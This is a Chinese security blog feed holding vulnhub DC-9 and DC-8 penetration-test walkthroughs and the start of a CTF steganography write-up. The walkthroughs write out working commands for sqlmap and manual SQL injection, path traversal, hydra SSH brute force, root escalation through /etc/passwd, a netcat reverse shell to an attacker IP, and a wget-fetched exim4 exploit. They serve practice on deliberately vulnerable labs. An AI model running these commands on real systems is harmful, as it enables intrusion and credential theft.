id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151108793.png" alt="image-20240415110806734"></p><p>发现两个可能存在问题的页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130487.png" alt="image-20240415113001414"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130693.png" alt="image-20240415113006626"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>直接用xray扫一遍 </p><pre><code>.\xray_windows_amd64.exe webscan --basic-crawler http://192.168.204.138/ --html-output out.html</code></pre><p>查看out.html 看来是results.php页面存在sql注入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151150014.png" alt="image-20240415115022932"></p><p>直接上sqlmap</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; --dbs --level=5</code></pre><p>要写<code>--date &quot;search=123456&quot;</code> 参数是因为我们在search.php页面搜索框输入内容之后 会直接跳转到results.php 使用POST方法传入一个<code>search</code>参数</p><p>有三个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151509572.png" alt="image-20240415150917512"></p><p>先爆users数据库的表</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users --tables --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151510643.png" alt="image-20240415151047575"></p><p>爆字段 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails --columns --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151511447.png" alt="image-20240415151157366"></p><p>爆用户名和密码</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails -C &quot;password,username&quot; --dump --level=5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151513568.png" alt="image-20240415151306497"></p><p>得到了普通用户的用户名和密码</p><p>接着来爆Staff数据库 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff --tables --level=5python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --columns --level=5 python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --dump --level=5</code></pre><p>得到表中的admin用户密码是哈希值 但是sqlmap可以直接进行爆破 得到明文是<code>transorbital1</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151519482.png" alt="image-20240415151903397"></p><h4 id="登陆网站"><a href="#登陆网站" class="headerlink" title="登陆网站"></a>登陆网站</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520596.png" alt="image-20240415152003554"></p><p>使用上面爆破出来的密码成功登陆  但是看到下面的<code>File does not exist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520427.png" alt="image-20240415152026369"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>想到存在文件包含 </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/passwd</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151939819.png" alt="image-20240415193910763"></p><p>成功执行 发现其中的很多用户都在我们上面爆出来的数据库中的普通用户中出现过 </p><h3 id="三、ssh远程连接靶机"><a href="#三、ssh远程连接靶机" class="headerlink" title="三、ssh远程连接靶机"></a>三、ssh远程连接靶机</h3><h4 id="敲门服务"><a href="#敲门服务" class="headerlink" title="敲门服务"></a>敲门服务</h4><p>看到很多用户都在那我们应该尝试使用ssh进行连接靶机 但是之前我们在扫描端口的时候发现22端口开放的ssh服务显示的是被过滤的状态 搜一下这个情况</p><p><a href="https://cloud.tencent.com/developer/article/1782065">通过Knockd隐藏SSH，让黑客看不见你的服务器</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152002647.png" alt="image-20240415200255585"></p><p>看到是使用了knockd端口敲门服务 隐藏了ssh服务</p><p><a href="https://www.cnblogs.com/f-carey/p/16066178.html">knockd端口敲门服务</a></p><pre><code>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</code></pre><p>为了可以重新开启ssh服务 我们要查看敲门服务的配置文件<code>/etc/knockd.conf</code> </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/knockd.conf</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152006026.png" alt="image-20240415200604990"></p><p>我们可以从配置文件中得到出来敲门暗号的顺序 </p><pre><code>sequence = 7469,8475,9842  # 开启服务顺序sequence = 9842,8475,7469  # 关闭服务顺序</code></pre><p>下面我们就利用敲门暗号来开启被过滤的ssh服务</p><pre><code class="bash">apt install knockd  # 安装knockdsystemctl start knockd # 启动knockd服务knock 192.168.204.138 7469 8475 9842  # 使用暗号进行敲门nmap -A -p- 192.168.204.138  # 扫描靶机端口</code></pre><p>可以看到靶机的ssh服务成功被开启</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152021880.png" alt="image-20240415202126831"></p><h4 id="hydra爆破用户密码"><a href="#hydra爆破用户密码" class="headerlink" title="hydra爆破用户密码"></a>hydra爆破用户密码</h4><p>将刚刚数据库中的用户名和密码单独放到两个字典文件中 <font color='red'> 这里要注意 用户名和密码字典中每行用户名和密码后面千万不能有空格 否则是爆不出来的 <del>问就是血的教训QAQ</del></font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152034860.png" alt="image-20240415203445829"></p><p>使用hydra进行爆破</p><pre><code class="bash">hydra -L username.txt -P passwd.txt ssh://192.168.204.138</code></pre><p>爆破出三组用户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162108924.png" alt="image-20240416210803862"></p><pre><code>login: chandlerb   password: UrAG0D!login: joeyt   password: Passw0rdlogin: janitor   password: Ilovepeepee</code></pre><p>用这三个用户都登陆一下靶机 发现登陆到janitor靶机的时候 在登陆后的默认文件夹中有个隐藏文件夹 另外两个用户里面没有</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162121760.png" alt="image-20240416212109728"></p><p>进入文件夹 查看里面的文件<code>passwords-found-on-post-it-notes.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162122905.png" alt="image-20240416212217860"></p><p>看起来还是密码 将这几个密码放入刚才的密码字典中 在爆破一下 发现又爆破出一个用户<code>fredf</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162125625.png" alt="image-20240416212534564"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>用这个用户在ssh连接一下 执行<code>sudo -l</code>命令看一下可以使用的sudo权限命令 发现<code>/opt/devstuff/dist/test/test</code> 这个文件可以无密码以sudo权限执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162225736.png" alt="image-20240416222540670"></p><p>我们进入文件夹 读取一下这个文件的内容 是一个linux中的可执行程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162231229.png" alt="image-20240416223137150"></p><p>尝试运行 发现回显是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404171446154.png" alt="image-20240416223630531"></p><p>告诉了我们test.py的使用方法  那我们来找一下这个文件</p><pre><code>find / -name &quot;test.py&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162242150.png" alt="image-20240416224204963"></p><p>进行读取</p><pre><code class="python">#!/usr/bin/pythonimport sysif len (sys.argv) != 3 :    print (&quot;Usage: python test.py read append&quot;)    sys.exit (1)else :    f = open(sys.argv[1], &quot;r&quot;)    output = (f.read())    f = open(sys.argv[2], &quot;a&quot;)    f.write(output)    f.close()</code></pre><p>这段代码的意思就是读取参数1中的内容 将这个内容追加到参数2中 同时 运行时的参数不是3的话 就会报错</p><p>那我们就可以在创建一组用户名和密码 将这个内容写入&#x2F;etc&#x2F;passwd文件中 在切换用户 就可以获得root权限</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt admin admin# $1$admin$1kgWpnZpUx.vTroWPXPIB0</code></pre><p>利用test可执行程序将这个新用户添加到<code>/etc/passwd</code></p><pre><code>echo &#39;admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash&#39; &gt; /tmp/passwdsudo /opt/devstuff/dist/test/test  /tmp/passwd /etc/passwd</code></pre><p>在切换用户 已经是roo权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162313083.png" alt="image-20240416231342990"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162314972.png" alt="image-20240416231419833"></p><pre><code>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                             Congratulations - you have done well to get to this point.Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all thosewho have taken the time to complete the various DC challenges.I also want to send out a big thank you to the various members of @m0tl3ycr3w .They are an inspirational bunch of fellows.Sure, they might smell a bit, but...just kidding.  :-)Sadly, all things must come to an end, and this will be the last everchallenge in the DC series.So long, and thanks for all the fish.</code></pre><p>至此 我们拿到了flag  DC系列靶机也告一段落 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.xray扫到sql注入漏洞</p><p>2.sqlmap进行自动化注入 找到网站登陆账密 和普通用户账密</p><p>3.使用普通用户账密 hydra爆破靶机登陆账密 </p><p>4.敲门服务 连接ssh</p><p>4.找到隐藏文件 切换用户</p><p>5.可执行程序 添加root用户提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-9&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-9&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-9&quot;&gt;&lt;/a&gt;vulnhub靶场DC-9&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023FIC(除了两个程序分析)</title>
    <link href="http://w3nx1z1.github.io/2024/04/13/2023FIC/"/>
    <id>http://w3nx1z1.github.io/2024/04/13/2023FIC/</id>
    <published>2024-04-13T12:31:22.799Z</published>
    <updated>2024-04-13T12:33:36.638Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9fb43e0121b98b661ac3613444f8ebabff674ecfa51fb767f22a74957b654905"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2023浙警联合赛</title>
    <link href="http://w3nx1z1.github.io/2024/04/11/2023%E6%B5%99%E8%AD%A6%E8%81%94%E5%90%88%E8%B5%9B/"/>
    <id>http://w3nx1z1.github.io/2024/04/11/2023%E6%B5%99%E8%AD%A6%E8%81%94%E5%90%88%E8%B5%9B/</id>
    <published>2024-04-11T10:15:08.914Z</published>
    <updated>2024-04-11T10:19:40.974Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8fa481c3dae392fa2c1d10c51ebd6d8021f2c9b2b29498819c82d7fdef98bd6"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-8</title>
    <link href="http://w3nx1z1.github.io/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/"/>
    <id>http://w3nx1z1.github.io/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/</id>
    <published>2024-04-03T08:22:55.429Z</published>
    <updated>2024-04-04T14:35:27.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-8"><a href="#vulnhub靶场DC-8" class="headerlink" title="vulnhub靶场DC-8"></a>vulnhub靶场DC-8</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>靶场描述里面告诉我们 DC-8靶场利用了双因素身份验证 最终目标是绕过双因素身份验证，获取root并读取flag 在渗透过程中可能需要使用ssh登陆</p><pre><code>双因素身份验证（Two-Factor Authentication，简称2FA）是一种增强账户安全性的方法，它要求用户在登录时提供两个不同的身份验证因素，通常是密码和另外一种验证方式，如手机验证码、指纹识别、硬件令牌等。这种方法可以有效防止仅仅依靠密码登录账户时可能出现的安全漏洞。通过使用双因素身份验证，即使黑客获取了用户的密码，也无法直接登录账户，因为他们没有第二个身份验证因素。这样可以大大提高账户的安全性，减少被盗号的风险。常见的双因素身份验证方式包括：短信验证码：用户在登录时会收到一条包含验证码的短信，需要输入正确的验证码才能完成登录。软件令牌：用户需要在手机上安装一个生成动态验证码的应用程序，每次登录时需要输入正确的动态验证码。硬件令牌：类似于软件令牌，但是使用物理设备生成动态验证码，如USB密钥或智能卡。生物识别：使用指纹、面部识别或虹膜扫描等生物特征进行身份验证。使用双因素身份验证可以提高账户的安全性，因为即使密码泄露，黑客也无法轻易登录账户。同时，双因素身份验证也可以用于其他敏感操作，如支付、修改账户信息等。</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404032133501.png" alt="image-20240403213329416"></p><p>ip为<code>192.168.204.134</code> 开放了22端口和80端口</p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.134</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404032134296.png" alt="image-20240403213454191"></p><pre><code>开放22端口 开放22端口 存在ssh服务 Openssh 版本7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><p>此外我们还可以得知 网站在robots.txt文件中对爬虫或者搜索引擎不能访问的地址进行了限制 下面这些地址是不能访问的</p><pre><code>/includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt /LICENSE.txt /MAINTAINERS.txt</code></pre><p>还看到这个网站使用的框架是Drupal7</p><pre><code>http-generator: Drupal 7 (http://drupal.org)</code></pre><p>再用whatweb来看一下指纹信息</p><pre><code>whatweb -v http://192.168.204.134 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041812860.png" alt="image-20240404181247801"></p><p>接下来扫目录 只查看状态码为200的目录</p><pre><code>python3 dirsearch.py -u http://192.168.204.134 -i 200 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041815828.png" alt="image-20240404181546792"></p><p>扫出后台登陆地址</p><pre><code>/user/login</code></pre><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041820721.png" alt="image-20240404182015674"></p><p>点一下<code>Welcome to DC-8</code>看到url中出现nid参数</p><pre><code>http://192.168.204.134/?nid=1</code></pre><p>先输入万能钥匙看一下</p><pre><code>1&#39; or 1=1--+</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041939894.png" alt="image-20240404193946860"></p><p>存在sql注入 复习一波手工注入</p><h4 id="1-联合查询猜字段数"><a href="#1-联合查询猜字段数" class="headerlink" title="1.联合查询猜字段数"></a>1.联合查询猜字段数</h4><p>我们观察上面的报错 发现不需要在最后加上<code>;</code>  也不需要在1后面加<code>&#39;</code></p><pre><code>http://192.168.204.134/?nid=1 order by 2</code></pre><p>到2就回显报错 说明字段数为1 </p><h4 id="2-查询数据库名"><a href="#2-查询数据库名" class="headerlink" title="2.查询数据库名"></a>2.查询数据库名</h4><p>因为只有一个字段 也不需要在测试回显了 我们直接开始查询</p><pre><code>http://192.168.204.134/?nid=9 union select database()</code></pre><p>查到数据库名</p><pre><code>d7db</code></pre><h4 id="3-查询表名"><a href="#3-查询表名" class="headerlink" title="3.查询表名"></a>3.查询表名</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042000425.png" alt="image-20240404200016380"></p><h4 id="4-查询表中字段名"><a href="#4-查询表中字段名" class="headerlink" title="4.查询表中字段名"></a>4.查询表中字段名</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042001296.png" alt="image-20240404200111267"></p><h4 id="5-查询数据"><a href="#5-查询数据" class="headerlink" title="5.查询数据"></a>5.查询数据</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(name,pass) from users</code></pre><pre><code>,admin$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z,john$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</code></pre><h4 id="6-爆破密码"><a href="#6-爆破密码" class="headerlink" title="6.爆破密码"></a>6.爆破密码</h4><p>将两个密码密文粘贴到hash.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042029656.png" alt="image-20240404202902604"></p><pre><code>john --wordlist=password.lst hash.txtjohn --show hash.txt</code></pre><p>得到john用户的密码<code>turtle</code></p><h3 id="三、登陆网站后台"><a href="#三、登陆网站后台" class="headerlink" title="三、登陆网站后台"></a>三、登陆网站后台</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042031823.png" alt="image-20240404203102764"></p><p>依旧是寻找可以注入的点 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042042168.png" alt="image-20240404204212120"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042043205.png" alt="image-20240404204325157"></p><p>Drupal7不同于Drupal8 没有php代码保护 不需要我们在单独安装模块 我们先测试一波 将<code>Text format</code>选择为php code</p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042115963.png" alt="image-20240404211557905"></p><p>保存配置 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042118515.png" alt="image-20240404211808459"></p><p>回到Contact Us主页面 随便输入一些信息(注意Email Address部分需要满足一定的邮箱格式) 点击Submit</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042119878.png" alt="image-20240404211935825"></p><p>此时php语句已经成功被执行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042120312.png" alt="image-20240404212051252"></p><h3 id="四、反弹shell"><a href="#四、反弹shell" class="headerlink" title="四、反弹shell"></a>四、反弹shell</h3><p>有了上面的验证 我们直接写语句进行反弹shell</p><p>重复刚才的步骤  写入</p><pre><code>&lt;?phpsystem(&quot;nc -e /bin/bash 192.168.204.129 1111&quot;); ?&gt;</code></pre><p>在我们的kali攻击机中监听端口</p><pre><code>nc -lvvp 1111</code></pre><p>回到Contact Us主页面 点击Submit 反弹shell成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042135637.png" alt="image-20240404213541597"></p><p>创造一个交互式页面</p><pre><code>./46996.sh -m netcat</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042139987.png" alt="image-20240404213933944"></p><h3 id="五、exim4提权"><a href="#五、exim4提权" class="headerlink" title="五、exim4提权"></a>五、exim4提权</h3><p>www-data是个低权限用户 我们查找一下他可以利用的suid提权方法</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042142572.png" alt="image-20240404214211541"></p><p>看到熟悉的exim4 和DC-4一样的操作</p><p>找到脚本的路径</p><pre><code>searchsploit -p 46996.sh</code></pre><p><a href="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png"><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></a></p><p>将脚本复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh </code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p><pre><code>mv 46996.sh /var/www/html </code></pre><p>将文件从攻击机下载到靶机<code>/tmp</code>中</p><pre><code>wget http://192.168.160.150/46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042148502.png" alt="image-20240404214814404"></p><p>赋予执行权限</p><pre><code>chmod +x 46996.sh</code></pre><p>执行脚本 发现得到root权限</p><pre><code>./46996.sh -m netcatwhoami</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042148195.png" alt="image-20240404214841118"></p><p>进入root文件夹 获取flag</p><pre><code>cd /rootcat flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042151688.png" alt="image-20240404215123628"></p><p>至此 DC-8结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.sql注入联合查询获取网站后台登陆密码</p><p>2.命令注入反弹shell</p><p>3.exim4提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-8&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-8&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-8&quot;&gt;&lt;/a&gt;vulnhub靶场DC-8&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023极客大挑战</title>
    <link href="http://w3nx1z1.github.io/2024/04/01/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>http://w3nx1z1.github.io/2024/04/01/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
    <published>2024-04-01T08:26:09.619Z</published>
    <updated>2024-04-01T08:27:52.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023极客大挑战"><a href="#2023极客大挑战" class="headerlink" title="2023极客大挑战"></a>2023极客大挑战</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="DEATH-N0TE-图片放缩"><a href="#DEATH-N0TE-图片放缩" class="headerlink" title="DEATH_N0TE(图片放缩)"></a>DEATH_N0TE(图片放缩)</h3><p>题目说有两部分flag  且隐写信息极多 那就好说多了 直接考虑图片隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318707.png" alt="image-20231028131843223"></p><p>使用010editor在图片尾找到一串字符 进行base解码</p><pre><code>&quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot;&quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot;&quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot;</code></pre><p>既然是png文件 在考虑一下lsb隐写 </p><p>一看这幅死样子 果然有问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281309995.png" alt="image-20231028130932821"></p><p>提取一下信息 在r g b三通道的0位 又是一串base编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626470.png" alt="image-20231028131028697"></p><p>解码 得到第一部分flag</p><pre><code>&quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot;&quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot;&quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot;</code></pre><p>在观察lsb隐写的时候就会发现 图片表面好像是有水印一样 依稀能辨认出是什么字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281315702.png" alt="image-20231028131506633"></p><p>猜测是一些奇怪字体的英文字母 结合是《死亡笔记》的大背景 搜索一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281315573.png" alt="image-20231028131556530"></p><p>确认是哥特字体 找个对照图 <a href="https://tieba.baidu.com/p/1442714710">死亡笔记中哥特字体对照图 </a>  有一点要注意 原图下半部分颜色太亮 会影响水印的观察读取 使用ps将颜色调成全黑 就可以看清了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404011626468.png" alt="image-20231028131707893"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281317951.png" alt="image-20231028131719892"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318686.png" alt="image-20231028131801643"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310281318512.png" alt="image-20231028131821465"></p><p>分成四部分来看 结果是 </p><pre><code>TkFNRV9vMnRha3VYWH0=</code></pre><p>看到后面有等号 鉴定为base64 